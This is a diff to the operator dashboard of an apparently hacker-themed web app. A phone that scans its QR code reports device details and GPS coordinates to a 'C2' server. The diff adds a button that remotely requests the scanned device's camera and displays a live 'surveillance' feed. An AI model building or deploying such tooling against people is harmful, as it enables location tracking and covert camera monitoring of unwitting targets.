@@ -5,7 +5,8 @@ import Terminal from '../components/Terminal';
 import QRCodeDisplay from '../components/QRCodeDisplay';
 import HackerMap from '../components/HackerMap';
 import { mqttService } from '../services/mqttService';
-import { TerminalLog, DeviceInfo } from '../types';
+import { TerminalLog, DeviceInfo, StreamMessage } from '../types';
+import { Camera, X, Disc, Video } from 'lucide-react';
 
 const Dashboard: React.FC = () => {
   const [sessionId] = useState(uuidv4());
@@ -14,10 +15,15 @@ const Dashboard: React.FC = () => {
   const [targetUrl, setTargetUrl] = useState('');
   const [targetCoords, setTargetCoords] = useState<{lat: number, lng: number} | null>(null);
   
+  // Camera Surveillance State
+  const [showCameraModal, setShowCameraModal] = useState(false);
+  const [cameraStream, setCameraStream] = useState<string | null>(null);
+  const [isCameraActive, setIsCameraActive] = useState(false);
+  
   // Audio context for sound effects
   const audioCtxRef = useRef<AudioContext | null>(null);
 
-  const playSound = useCallback((type: 'connect' | 'data' | 'boot') => {
+  const playSound = useCallback((type: 'connect' | 'data' | 'boot' | 'alert') => {
     if (!audioCtxRef.current) {
       audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
     }
@@ -56,6 +62,14 @@ const Dashboard: React.FC = () => {
       gain.gain.linearRampToValueAtTime(0, now + 0.1);
       osc.start(now);
       osc.stop(now + 0.1);
+    } else if (type === 'alert') {
+      osc.type = 'square';
+      osc.frequency.setValueAtTime(200, now);
+      osc.frequency.linearRampToValueAtTime(100, now + 0.2);
+      gain.gain.setValueAtTime(0.1, now);
+      gain.gain.linearRampToValueAtTime(0, now + 0.2);
+      osc.start(now);
+      osc.stop(now + 0.2);
     }
   }, []);
 
@@ -68,21 +82,36 @@ const Dashboard: React.FC = () => {
       link
     }]);
     
-    // Play subtle data sound for every log, but heavier sound for success
     if (type === 'success' || type === 'warning') {
         playSound('data');
     }
   }, [playSound]);
 
+  const toggleCamera = () => {
+    if (!connected) {
+      addLog('ERROR: NO TARGET CONNECTED', 'error');
+      return;
+    }
+    
+    if (!isCameraActive) {
+      addLog('INITIATING_REMOTE_SURVEILLANCE_PROTOCOL...', 'warning');
+      mqttService.publishCommand(sessionId, { type: 'ACTIVATE_CAMERA', timestamp: new Date().toISOString() });
+      setShowCameraModal(true);
+      setIsCameraActive(true);
+    } else {
+      addLog('TERMINATING_SURVEILLANCE_FEED', 'system');
+      mqttService.publishCommand(sessionId, { type: 'STOP_CAMERA', timestamp: new Date().toISOString() });
+      setShowCameraModal(false);
+      setIsCameraActive(false);
+      setCameraStream(null);
+    }
+  };
+
   useEffect(() => {
-    // Construct the URL that the phone should open
-    // Using hash routing - Works perfectly on Vercel/Static hosting
     const baseUrl = window.location.href.split('#')[0];
     const scanUrl = `${baseUrl}#/scan?session=${sessionId}`;
     setTargetUrl(scanUrl);
 
-    // Initialize audio context on first user interaction if needed, 
-    // but here we just try to init it on mount (might be blocked until click, but acceptable for terminal)
     playSound('boot');
 
     addLog(`SYSTEM_BOOT_SEQUENCE_INITIATED`, 'system');
@@ -105,39 +134,23 @@ const Dashboard: React.FC = () => {
           addLog(`VENDOR: ${payload.vendor}`, 'info');
           addLog(`RESOLUTION: ${payload.screenWidth}x${payload.screenHeight}`, 'info');
           
-          if (payload.battery) {
-             addLog(`POWER_LEVEL: ${payload.battery}%`, 'info');
-          }
-          
-          if (payload.gpu) {
-             addLog(`GPU_RENDERER: ${payload.gpu}`, 'info');
-          }
+          if (payload.battery) addLog(`POWER_LEVEL: ${payload.battery}%`, 'info');
+          if (payload.gpu) addLog(`GPU_RENDERER: ${payload.gpu}`, 'info');
 
           if (payload.coords) {
              addLog(`GPS_TRIANGULATION: SUCCESS`, 'success');
              addLog(`LAT: ${payload.coords.latitude}`, 'warning');
              addLog(`LON: ${payload.coords.longitude}`, 'warning');
-             addLog(`ACCURACY: ${payload.coords.accuracy}m`, 'info');
-             
              const mapsUrl = `https://www.google.com/maps?q=${payload.coords.latitude},${payload.coords.longitude}`;
              addLog(`GENERATING_MAP_REFERENCE...`, 'system', mapsUrl);
-
-             // Update state to show map
              setTargetCoords({
                lat: payload.coords.latitude,
                lng: payload.coords.longitude
              });
-             
           } else {
              addLog(`GPS_SIGNAL: NOT_DETECTED/DENIED`, 'error');
           }
           
-          // Break down User Agent
-          const ua = payload.userAgent;
-          if (ua.includes('Android')) addLog(`OS_FAMILY: Android`, 'warning');
-          if (ua.includes('iPhone')) addLog(`OS_FAMILY: iOS`, 'warning');
-          
-          addLog(`USER_AGENT_RAW: ${ua.substring(0, 40)}...`, 'system');
           addLog(`DATA_EXTRACTION_COMPLETE.`, 'success');
           addLog(`-----------------------------------`, 'system');
         }, 800);
@@ -145,6 +158,12 @@ const Dashboard: React.FC = () => {
       () => {
         setConnected(true);
         addLog(`C2_SERVER_ONLINE. Waiting for target...`, 'success');
+      },
+      // No inbound commands for dashboard
+      undefined, 
+      // Stream handler
+      (streamData: StreamMessage) => {
+        setCameraStream(streamData.image);
       }
     );
 
@@ -157,15 +176,34 @@ const Dashboard: React.FC = () => {
     <div 
       className="flex flex-col md:flex-row h-screen w-screen overflow-hidden"
       onClick={() => {
-        // Ensure audio context is resumed on click if browser blocked autoplay
         if (audioCtxRef.current?.state === 'suspended') {
           audioCtxRef.current.resume();
         }
       }}
     >
       {/* Left Side: Terminal */}
-      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20">
-        <Terminal logs={logs} connected={connected} sessionId={sessionId} />
+      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20 flex flex-col">
+        <div className="flex-1 overflow-hidden">
+           <Terminal logs={logs} connected={connected} sessionId={sessionId} />
+        </div>
+        
+        {/* Terminal Controls */}
+        <div className="bg-gray-900 border-t border-gray-800 p-2 flex justify-end gap-2">
+           <button 
+             onClick={toggleCamera}
+             disabled={!connected}
+             className={`flex items-center gap-2 px-4 py-2 text-xs font-mono font-bold uppercase tracking-wider border transition-all ${
+               isCameraActive 
+               ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' 
+               : connected 
+                 ? 'bg-gray-800 border-gray-600 text-gray-300 hover:border-green-500 hover:text-green-500 hover:bg-green-900/20' 
+                 : 'bg-black border-gray-800 text-gray-700 cursor-not-allowed'
+             }`}
+           >
+             <Camera size={14} />
+             {isCameraActive ? 'STOP_SURVEILLANCE' : 'ACTIVATE_CAM_FEED'}
+           </button>
+        </div>
       </div>
 
       {/* Right Side: QR Code OR Hacker Map */}
@@ -176,6 +214,51 @@ const Dashboard: React.FC = () => {
           <QRCodeDisplay url={targetUrl} />
         )}
       </div>
+
+      {/* Surveillance Modal */}
+      {showCameraModal && (
+        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+          <div className="bg-black border border-red-900 w-full max-w-2xl shadow-[0_0_50px_rgba(255,0,0,0.2)] flex flex-col">
+            <div className="bg-red-900/20 border-b border-red-900/50 p-2 flex justify-between items-center text-red-500 font-mono text-xs uppercase tracking-wider">
+              <div className="flex items-center gap-2">
+                 <Disc size={12} className="animate-pulse text-red-600" />
+                 <span>LIVE_FEED :: {sessionId.substring(0,8)}</span>
+              </div>
+              <button onClick={toggleCamera} className="hover:text-white"><X size={16} /></button>
+            </div>
+            
+            <div className="relative aspect-video bg-black flex items-center justify-center overflow-hidden group">
+              {/* Scanlines Overlay */}
+              <div className="absolute inset-0 z-20 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%]"></div>
+              <div className="absolute inset-0 z-20 pointer-events-none animate-[flicker_0.15s_infinite] bg-green-500/5 mix-blend-overlay"></div>
+              
+              {cameraStream ? (
+                <img src={cameraStream} className="w-full h-full object-cover filter contrast-125 brightness-90 grayscale hover:grayscale-0 transition-all duration-500" alt="Surveillance Feed" />
+              ) : (
+                <div className="text-red-500 font-mono text-xs animate-pulse flex flex-col items-center gap-2">
+                  <Video size={32} />
+                  <span>ESTABLISHING_VIDEO_UPLINK...</span>
+                  <span className="text-[10px] text-gray-500">WAITING FOR USER AUTHORIZATION</span>
+                </div>
+              )}
+
+              {/* HUD Elements */}
+              <div className="absolute top-4 right-4 z-30 flex items-center gap-2 text-red-500 text-xs font-mono font-bold">
+                 <div className="w-2 h-2 rounded-full bg-red-500 animate-ping"></div>
+                 REC
+              </div>
+              <div className="absolute bottom-4 left-4 z-30 text-green-500 text-[10px] font-mono opacity-60">
+                 CAM_01 // ISO 800 // F2.8
+              </div>
+               {/* Crosshair */}
+               <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-12 h-12 border border-red-500/30 z-20">
+                  <div className="absolute top-1/2 left-0 w-full h-[1px] bg-red-500/30"></div>
+                  <div className="absolute top-0 left-1/2 h-full w-[1px] bg-red-500/30"></div>
+               </div>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
